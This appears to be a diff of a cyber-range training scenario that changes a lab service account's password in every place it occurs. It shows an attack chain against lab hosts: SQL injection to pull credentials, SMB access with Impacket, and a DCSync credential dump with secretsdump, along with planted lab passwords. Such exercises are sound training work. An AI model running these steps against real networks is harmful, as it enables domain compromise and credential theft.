@@ -337,7 +337,7 @@ msel:
               |----------|----------|----------|
               | John Smith | jsmith | Summer2024 |
               | Mary Williams | mwilliams | Welcome123 |
-              | **Backup Service** | **svc_backup** | **Backup2024!** |
+              | **Backup Service** | **svc_backup** | **Backup2024** |
 
               > **The service account is your ticket to the internal network!**
 
@@ -360,7 +360,7 @@ msel:
               ### Connect to the File Server
 
               ```bash
-              impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+              impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
               ```
 
               ### If Connected, List Shares
@@ -405,7 +405,7 @@ msel:
 
               ```bash
               echo -e 'use sensitive\ncat passwords.txt\nexit' | \
-                impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+                impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
               ```
 
           - id: step3_3
@@ -470,7 +470,7 @@ msel:
               Use Impacket's secretsdump to perform DCSync:
 
               ```bash
-              impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
+              impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.12'
               ```
 
               ### ⚠️ Note About This Lab
@@ -607,7 +607,7 @@ msel:
                  └── Employee Directory (?page_id=4)
                      └── SQLi in employee_id parameter
                          └── Extracted credentials:
-                             - svc_backup / Backup2024!
+                             - svc_backup / Backup2024
 
               3. LATERAL MOVEMENT
                  └── Credential reuse on file server (172.16.2.10)
@@ -661,7 +661,7 @@ events:
       Extract VPN credentials from the wp_acme_employees table:
         - jsmith / Summer2024
         - mwilliams / Welcome123
-        - svc_backup / Backup2024!
+        - svc_backup / Backup2024
 
   - sequence: 3
     delay_minutes: 30
@@ -670,13 +670,13 @@ events:
       Use extracted credentials to access the internal file server with Impacket.
 
       Using impacket-smbclient (interactive):
-        impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
+        impacket-smbclient 'svc_backup:Backup2024@172.16.2.10'
         # use sensitive
         # ls
         # cat passwords.txt
 
       Alternative with traditional smbclient:
-        smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024!' -c 'ls'
+        smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024' -c 'ls'
 
       The passwords.txt file contains the Domain Administrator password.
 
@@ -689,7 +689,7 @@ events:
       Credentials from passwords.txt: Administrator / Adm1n2024!
 
       Attempt DCSync with Impacket (svc_backup has replication rights):
-        impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
+        impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.12'
 
       Note: Samba 4 has limited DCSync support. If secretsdump fails, use the
       Domain Admin credentials from passwords.txt directly.
@@ -731,7 +731,7 @@ credentials:
       password: "Welcome123"
   service_accounts:
     - username: svc_backup
-      password: "Backup2024!"
+      password: "Backup2024"
       notes: "DCSync rights on domain"
   domain_admin:
     username: Administrator
